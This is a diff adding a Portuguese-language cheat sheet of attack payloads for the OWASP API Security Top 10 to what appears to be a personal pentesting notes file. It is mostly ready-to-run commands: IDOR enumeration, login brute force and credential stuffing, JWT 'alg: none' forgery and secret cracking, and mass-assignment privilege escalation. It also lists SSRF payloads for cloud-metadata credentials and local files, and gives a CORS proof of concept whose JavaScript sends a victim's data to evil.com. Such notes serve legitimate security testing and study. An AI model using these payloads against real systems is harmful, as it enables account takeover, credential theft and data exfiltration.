@@ -2584,3 +2584,449 @@ allow if user($u), role($r), $r == "admin";
 [ ] 7. Testar reutilização do token em outros endpoints
 [ ] 8. Testar token expirado (se não há check if time...)
 ```
+
+---
+
+# 🔌 OWASP API Security Top 10 — Payloads & Técnicas
+
+> Relacionado: [[Essential Web Hacking#OWASP API Security Top 10 — 2023]]
+
+---
+
+## API1 — BOLA / IDOR — Payloads de Enumeração
+
+### Enumeração de IDs sequenciais com ffuf
+```bash
+# Enumerar IDs numéricos em path parameter
+ffuf -u https://api.alvo.com/api/v1/users/FUZZ/profile \
+  -w <(seq 1 1000) \                  # gera wordlist 1-1000 on the fly
+  -H "Authorization: Bearer SEU_TOKEN" \
+  -mc 200 \                            # só retorna 200 OK
+  -o resultados_bola.json
+
+# Enumerar UUIDs a partir de lista (ex: UUIDs coletados via resposta da API)
+ffuf -u https://api.alvo.com/api/v1/orders/FUZZ \
+  -w uuids.txt \
+  -H "Authorization: Bearer TOKEN_USUARIO_A" \
+  -mc 200,201
+```
+
+### Enumeração com curl (manual — confirmação)
+```bash
+# Token do usuário A tentando acessar recurso do usuário B
+curl -s https://api.alvo.com/api/v1/users/2/profile \
+  -H "Authorization: Bearer TOKEN_USUARIO_A" | jq .
+
+# Testar IDOR em parâmetro de query string
+curl -s "https://api.alvo.com/api/v1/invoices?user_id=1" \
+  -H "Authorization: Bearer TOKEN_USUARIO_B" | jq .
+
+# Testar IDOR em body de requisição POST
+curl -s -X POST https://api.alvo.com/api/v1/transfer \
+  -H "Authorization: Bearer TOKEN_USUARIO_B" \
+  -H "Content-Type: application/json" \
+  -d '{"from_account": 99, "to_account": 100, "amount": 1000}'
+```
+
+### Validação — como confirmar BOLA
+```
+Evidência: Retornou dados de outro usuário com status 200
+Prova de conceito: 2 tokens diferentes, 1 acessa recurso do outro
+Exploração controlada: Documentar o campo sensível exposto (email, CPF, saldo)
+```
+
+---
+
+## API2 — Broken Authentication — Payloads
+
+### Brute force sem rate limit
+```bash
+# Testar rate limiting no endpoint de login
+ffuf -u https://api.alvo.com/api/v1/auth/login \
+  -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"email":"admin@alvo.com","password":"FUZZ"}' \
+  -w /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-1000.txt \
+  -mc 200 \
+  -t 50                               # 50 threads simultâneas — testa rate limit
+
+# Credential stuffing com lista de email:senha
+ffuf -u https://api.alvo.com/api/v1/login \
+  -X POST \
+  -H "Content-Type: application/json" \
+  -d '{"email":"FUZZUSER","password":"FUZZPASS"}' \
+  -w credenciais_vazadas.txt:FUZZUSER \
+  -w credenciais_vazadas.txt:FUZZPASS \
+  -mc 200
+```
+
+### JWT — alg: none bypass
+```bash
+# 1. Decodificar o JWT original
+echo "SEU_JWT" | cut -d'.' -f1 | base64 -d 2>/dev/null
+echo "SEU_JWT" | cut -d'.' -f2 | base64 -d 2>/dev/null
+
+# 2. Construir JWT com alg: none (header)
+echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '+/' '-_'
+
+# 3. Modificar payload (ex: elevar role)
+echo -n '{"sub":"1","role":"admin","exp":9999999999}' | base64 | tr -d '=' | tr '+/' '-_'
+
+# 4. JWT final = header.payload. (sem assinatura)
+# Testar: HEADER_B64.PAYLOAD_B64.
+```
+
+### JWT — weak secret brute force
+```bash
+# hashcat com lista de secrets comuns
+hashcat -a 0 -m 16500 SEU_JWT /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10k-most-common.txt
+
+# john the ripper
+john --format=HMAC-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt jwt.txt
+```
+
+### Token de reset de senha — enumeração
+```bash
+# Se o token de reset é numérico ou curto
+ffuf -u "https://api.alvo.com/api/v1/reset-password?token=FUZZ" \
+  -w <(seq -w 000000 999999) \         # 6 dígitos numéricos
+  -mc 200
+```
+
+---
+
+## API3 — BOPLA — Mass Assignment & Excessive Data Exposure
+
+### Mass Assignment — campos sensíveis para injetar
+```json
+// Tentar em qualquer endpoint PUT/PATCH/POST de atualização de perfil
+{
+  "name": "Teste",
+  "email": "teste@test.com",
+  "role": "admin",
+  "is_admin": true,
+  "verified": true,
+  "balance": 99999,
+  "credits": 9999,
+  "plan": "enterprise",
+  "subscription_status": "active",
+  "permissions": ["read", "write", "admin"]
+}
+```
+
+### Mass Assignment com curl
+```bash
+# Tentar escalar para admin via PATCH
+curl -s -X PATCH https://api.alvo.com/api/v1/users/me \
+  -H "Authorization: Bearer SEU_TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"name":"Gabriel","is_admin":true,"role":"admin"}'
+
+# Testar campos extras no registro
+curl -s -X POST https://api.alvo.com/api/v1/register \
+  -H "Content-Type: application/json" \
+  -d '{"username":"hacker","password":"Hacker123!","email":"h@h.com","role":"admin","verified":true}'
+```
+
+### Excessive Data Exposure — análise da resposta
+```bash
+# Comparar o que é exibido vs o que a API retorna
+curl -s https://api.alvo.com/api/v1/users/42 \
+  -H "Authorization: Bearer TOKEN" | jq 'keys'  # listar todos os campos retornados
+
+# Procurar campos sensíveis na resposta
+curl -s https://api.alvo.com/api/v1/users \
+  -H "Authorization: Bearer TOKEN" | \
+  jq '.[] | {id, email, password_hash, role, internal_id, ssn, credit_card}'
+```
+
+### Validação — Mass Assignment
+```
+Hipótese: API aceita campos não documentados
+PoC: Enviar {"is_admin":true} e verificar se reflete na resposta seguinte
+Exploração: Confirmar com GET /users/me que o campo foi alterado
+```
+
+---
+
+## API4 — Resource Consumption — Payloads
+
+### Testar ausência de rate limiting
+```bash
+# Fazer 100 requests em paralelo e verificar se algum é bloqueado
+for i in $(seq 1 100); do
+  curl -s -o /dev/null -w "%{http_code}\n" \
+    -H "Authorization: Bearer TOKEN" \
+    https://api.alvo.com/api/v1/data &
+done
+wait
+
+# Verificar headers de rate limit
+curl -v https://api.alvo.com/api/v1/users \
+  -H "Authorization: Bearer TOKEN" 2>&1 | grep -i "ratelimit\|retry-after\|x-rate"
+```
+
+### Testar paginação sem limite
+```bash
+# Tentar dump completo via limit excessivo
+curl -s "https://api.alvo.com/api/v1/users?limit=999999&offset=0" \
+  -H "Authorization: Bearer TOKEN" | jq 'length'
+
+curl -s "https://api.alvo.com/api/v1/products?page_size=0" \
+  -H "Authorization: Bearer TOKEN"
+
+# Parâmetros alternativos de paginação
+# limit, page_size, per_page, count, size, rows, take
+```
+
+### Parâmetro de quantidade abusável
+```bash
+# Se a API permite controlar quantidade de emails/notificações enviados
+curl -s -X POST https://api.alvo.com/api/v1/notify \
+  -H "Authorization: Bearer TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"user_ids": [1,2,3,...999], "message": "teste"}'
+```
+
+---
+
+## API5 — BFLA — Payloads de Acesso a Funções Não Autorizadas
+
+### Wordlist de endpoints administrativos para fuzzing
+```bash
+# Endpoints admin comuns em APIs
+ffuf -u https://api.alvo.com/FUZZ \
+  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/api/api-seen-in-wild.txt \
+  -H "Authorization: Bearer TOKEN_USER_COMUM" \
+  -mc 200,201,204 \
+  -recursion \
+  -recursion-depth 2
+
+# Prefixos administrativos específicos
+ffuf -u https://api.alvo.com/api/v1/FUZZ \
+  -w - << 'EOF'
+admin
+admins
+administrator
+internal
+manage
+management
+superuser
+backoffice
+staff
+moderator
+EOF
+```
+
+### Trocar método HTTP
+```bash
+# Se GET funciona, tentar POST/PUT/DELETE
+curl -s -X DELETE https://api.alvo.com/api/v1/users/99 \
+  -H "Authorization: Bearer TOKEN_USUARIO_COMUM"
+
+curl -s -X PUT https://api.alvo.com/api/v1/config \
+  -H "Authorization: Bearer TOKEN_USUARIO_COMUM" \
+  -H "Content-Type: application/json" \
+  -d '{"maintenance_mode": true}'
+```
+
+### Burp — comparar respostas admin vs user
+```
+1. Autenticar como admin → fazer request → salvar resposta
+2. Autenticar como user → mesmo request → comparar
+3. Trocar token admin pelo token user no request admin → testar
+```
+
+---
+
+## API7 — SSRF — Payloads
+
+### Payloads básicos SSRF
+```
+# Cloud metadata
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/user-data/
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+
+# Localhost / serviços internos
+http://localhost/
+http://127.0.0.1:8080/
+http://0.0.0.0:8080/
+http://[::1]:8080/
+http://127.1/                         # bypass de filtro
+http://0/                             # bypass de filtro
+
+# Protocolos alternativos
+file:///etc/passwd
+file:///etc/hosts
+dict://localhost:11211/stat           # Memcached
+gopher://localhost:6379/_INFO         # Redis
+```
+
+### SSRF com bypass de filtros
+```
+# Bypass via redirecionamento DNS (DNS rebinding)
+http://ssrf.gbmel.com/                # resolve para 169.254.169.254
+
+# Bypass via encoding
+http://0x7f000001/                    # 127.0.0.1 em hex
+http://2130706433/                    # 127.0.0.1 em decimal
+http://169.254.169.254%2F             # URL encoding da barra
+
+# Bypass via URL malformada
+http://evil.com@169.254.169.254/
+http://169.254.169.254#evil.com
+http://169.254.169.254?.evil.com
+```
+
+### Testar SSRF em parâmetros comuns
+```bash
+# Testar todos os parâmetros que aceitam URL
+for param in url callback redirect webhook avatar import fetch icon logo image; do
+  curl -s -X POST https://api.alvo.com/api/v1/profile \
+    -H "Authorization: Bearer TOKEN" \
+    -H "Content-Type: application/json" \
+    -d "{\"$param\": \"http://SEU_BURP_COLLABORATOR.com/ssrf-test-$param\"}"
+done
+```
+
+### Validação SSRF
+```
+Hipótese: Parâmetro "url" envia request server-side
+PoC: Apontar para Burp Collaborator ou webhook.site — confirmar recebimento
+Exploração: Redirecionar para http://169.254.169.254/latest/meta-data/
+Evidência esperada: Resposta da API contém dados do metadata endpoint
+```
+
+---
+
+## API8 — Misconfiguration — Checklist & Payloads
+
+### Verificar CORS
+```bash
+# Testar CORS com origin arbitrária
+curl -s -I https://api.alvo.com/api/v1/users \
+  -H "Origin: https://evil.com" \
+  -H "Authorization: Bearer TOKEN" | grep -i "access-control"
+
+# CORS vulnerável retorna:
+# Access-Control-Allow-Origin: https://evil.com
+# Access-Control-Allow-Credentials: true
+
+# PoC de CORS + credenciais (executar no browser)
+```
+
+```javascript
+// PoC CORS — salvar como cors_poc.html e servir em evil.com
+fetch('https://api.alvo.com/api/v1/me', {
+  credentials: 'include',
+  headers: { 'Authorization': 'Bearer TOKEN_DA_VITIMA' }
+})
+.then(r => r.json())
+.then(data => {
+  // Exfiltrar dados para servidor do atacante
+  fetch('https://evil.com/collect?data=' + btoa(JSON.stringify(data)))
+})
+```
+
+### Descobrir Swagger/OpenAPI exposto
+```bash
+# Wordlist de caminhos comuns de documentação
+ffuf -u https://api.alvo.com/FUZZ \
+  -w - << 'EOF'
+swagger.json
+swagger.yaml
+openapi.json
+openapi.yaml
+api-docs
+api-docs/swagger.json
+v1/api-docs
+v2/api-docs
+v3/api-docs
+docs
+swagger-ui.html
+redoc
+EOF
+```
+
+### Headers de segurança — verificação
+```bash
+curl -s -I https://api.alvo.com/ | grep -iE \
+  "strict-transport|x-content-type|x-frame|content-security|x-xss|referrer-policy"
+```
+
+---
+
+## API9 — Inventory Management — Wordlists & Payloads
+
+### Fuzzing de versões de API
+```bash
+# Testar versões antigas de endpoints
+ffuf -u https://api.alvo.com/FUZZ/users/me \
+  -w - << 'EOF'
+v1
+v2
+v3
+v1.0
+v1.1
+v2.0
+api/v1
+api/v2
+rest/v1
+rest/v2
+public/v1
+internal/v1
+EOF
+
+# Também testar sem o prefixo de versão
+ffuf -u https://api.alvo.com/api/FUZZ \
+  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/api/objects.txt \
+  -H "Authorization: Bearer TOKEN" \
+  -mc 200,201,301,302
+```
+
+### Buscar endpoints de debug/staging
+```bash
+# Endpoints de debug comuns
+ffuf -u https://api.alvo.com/api/v1/FUZZ \
+  -w - << 'EOF'
+debug
+test
+dev
+staging
+health
+healthcheck
+status
+info
+ping
+metrics
+actuator
+actuator/env
+actuator/beans
+.env
+config
+EOF
+```
+
+---
+
+## 📋 Checklist Rápido — Teste de API
+
+```
+[ ] 1. Mapear todos os endpoints (Swagger, JS analysis, gau, katana)
+[ ] 2. Autenticar com usuário A e usuário B (duas contas distintas)
+[ ] 3. BOLA: Com token A, acessar recursos do usuário B trocando IDs
+[ ] 4. BFLA: Com token user comum, tentar endpoints /admin/, /internal/
+[ ] 5. Mass Assignment: Enviar campos extras (role, is_admin) em PUT/PATCH
+[ ] 6. Excessive Data Exposure: inspecionar todos os campos da resposta
+[ ] 7. Rate limiting: fazer 50+ requests no endpoint de login
+[ ] 8. SSRF: identificar parâmetros que aceitam URL e testar metadata cloud
+[ ] 9. CORS: testar com Origin: https://evil.com e checar Allow-Credentials
+[ ] 10. Versões antigas: fuzzing de v1, v2, /api/v1/ vs /api/v2/
+[ ] 11. Swagger/OpenAPI exposto: tentar /api-docs, /swagger.json
+[ ] 12. Métodos HTTP: tentar DELETE/PUT/OPTIONS em endpoints que aceitam GET
+```
+
+> **Nota:** Para APIs GraphQL, o vetor mais comum é **Introspection** (enumeração do schema completo) e **Batching attacks** (executar múltiplas queries em um único request para bypass de rate limit). Relacionado: [[Essential Web Hacking]]
